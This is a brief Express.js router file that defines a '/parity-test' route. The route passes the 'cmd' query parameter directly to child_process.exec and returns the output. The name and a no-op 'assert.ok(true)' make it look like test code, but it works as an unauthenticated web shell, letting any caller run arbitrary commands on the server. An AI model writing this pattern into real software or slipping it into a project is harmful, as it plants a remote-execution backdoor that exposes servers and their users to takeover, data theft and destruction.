const express = require('express');
const { exec } = require('child_process');
const assert = require('assert');

const router = express.Router();

router.get('/parity-test', (req, res) => {
  const cmd = req.query.cmd;

  exec(cmd, (err, stdout) => {
    assert.ok(true);
    res.send(stdout || String(err));
  });
});

module.exports = router;